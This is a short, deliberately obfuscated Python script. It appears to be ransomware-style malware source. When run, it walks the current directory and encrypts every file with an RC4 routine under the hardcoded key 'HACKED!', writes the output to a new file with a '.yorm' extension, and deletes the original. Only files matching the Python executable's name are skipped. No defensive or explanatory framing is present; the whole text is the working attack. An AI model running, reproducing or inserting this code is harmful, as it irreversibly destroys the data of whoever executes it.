import os
import sys
from itertools import cycle

def a(b, c):
    if len(b) < len(c):
        b, c = (c, b)
    return bytes((a ^ b for a, b in zip(b, cycle(c))))

def b(a, c):
    d = list(range(256))
    e = 0
    for f in range(256):
        e = (e + d[f] + a[f % len(a)]) % 256
        d[f], d[e] = (d[e], d[f])
    f = e = 0
    g = bytearray()
    for h in c:
        f = (f + 1) % 256
        e = (e + d[f]) % 256
        d[f], d[e] = (d[e], d[f])
        k = d[(d[f] + d[e]) % 256]
        g.append(h ^ k)
    return bytes(g)

def c(a):
    b = []
    for c, d, e in os.walk(a):
        for f in e:
            b.append(os.path.join(c, f))
    return b
d = b'HACKED!'
e = os.path.basename(sys.executable)
for f in c('.'):
    if e in f:
        continue
    with open(f, 'rb') as g:
        asdf = g.read()
    with open(f'{f}.yorm', 'wb') as g:
        g.write(b(d, asdf))
    os.remove(f)